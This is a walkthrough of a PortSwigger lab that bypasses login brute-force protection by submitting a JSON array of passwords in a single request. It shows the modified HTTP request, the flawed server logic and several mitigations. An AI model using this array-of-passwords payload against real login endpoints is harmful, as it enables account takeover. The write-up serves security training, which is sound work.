# Broken Brute-Force Protection - Multiple Credentials Per Request

## Lab Information

* **Lab Name:** Broken brute-force protection, multiple credentials per request
* **Difficulty:** Expert
* **Platform:** PortSwigger Web Security Academy
* **Category:** Authentication Vulnerabilities

---

# Objective

The objective of this lab is to:

1. Exploit flawed brute-force protection.
2. Bypass rate limiting/account lock mechanisms.
3. Brute-force Carlos's password using multiple credentials in a single request.
4. Access Carlos's account page.

---

# Vulnerability Overview

The application accepts login credentials in JSON format.

Instead of validating the password field as a single string, the server incorrectly accepts an array of passwords.

This allows attackers to:

* Submit multiple password guesses in one HTTP request.
* Bypass brute-force protections based on request count.
* Avoid triggering account lock or rate limiting.

---

# Tools Used

* Burp Suite
* Burp Repeater

---

# Step 1 - Intercept Login Request

1. Open the lab.
2. Attempt login with random credentials.
3. Capture the request in Burp Suite.

Example request:

```http id="r8quj7"
POST /login HTTP/2
Host: example.web-security-academy.net
Content-Type: application/json

{
    "username":"carlos",
    "password":"test"
}
```

---

# Step 2 - Send Request to Repeater

Right-click the request and select:

```text id="k0g63j"
Send to Repeater
```

---

# Step 3 - Modify Password Parameter

Replace the single password string with an array of candidate passwords.

Modified request:

```http id="pz0q8d"
POST /login HTTP/2
Host: example.web-security-academy.net
Content-Type: application/json

{
    "username":"carlos",
    "password":[
        "123456",
        "password",
        "qwerty",
        "letmein",
        "football",
        "monkey"
    ]
}
```

---

# Step 4 - Send Request

Click:

```text id="uhkhlt"
Send
```

The server processes all passwords in a single request.

---

# Step 5 - Observe Response

The response returns:

```http id="1p58fj"
HTTP/2 302 Found
```

This indicates:

* Successful authentication
* Session created
* Redirect to authenticated page

---

# Step 6 - Open Response in Browser

Right-click the request and select:

```text id="u4z6a4"
Show response in browser
```

Copy the generated URL and open it in the browser.

You are now logged in as:

```text id="v2zc2u"
carlos
```

---

# Step 7 - Access My Account

Click:

```text id="cphm48"
My Account
```

The lab is solved successfully.

---

# Why This Vulnerability Exists

The application's brute-force protection only counts:

* Number of HTTP requests

instead of:

* Number of password attempts

Because multiple passwords are submitted inside a single request:

* Rate limiting is bypassed
* Account locking is bypassed

---

# Impact

An attacker can:

* Bypass brute-force protection
* Test many passwords quickly
* Compromise accounts efficiently

This significantly weakens authentication security.

---

# Root Cause

Improper validation of input types.

The server:

* Expected a string
* Accepted an array

The application then iterated through all password values internally.

---

# Example of Vulnerable Logic

Pseudo-code example:

```python id="t7x6v7"
for pwd in password_array:
    if pwd == stored_password:
        login_success()
```

This allows multiple password attempts in one request.

---

# Mitigation

## Recommended Fixes

### 1. Strict Input Validation

Ensure password parameter only accepts strings.

Example:

```json id="xln5m0"
{
    "password":"mypassword"
}
```

Reject arrays or unexpected data types.

---

### 2. Count Authentication Attempts Properly

Rate limiting should count:

* Individual password attempts
* Not only HTTP requests

---

### 3. Implement Strong Rate Limiting

Apply limits based on:

* Account
* IP address
* Device fingerprint
* Session behavior

---

### 4. Add MFA

Multi-Factor Authentication reduces risk even if passwords are guessed.

---

# Key Learning

Brute-force protection mechanisms can fail due to application logic flaws.

Even advanced protections like:

* Rate limiting
* Account locking

can become useless if the server incorrectly processes multiple credentials inside a single request.

---

# Tags

`Authentication` `Brute Force` `Burp Suite` `JSON Injection` `Rate Limiting Bypass` `PortSwigger`
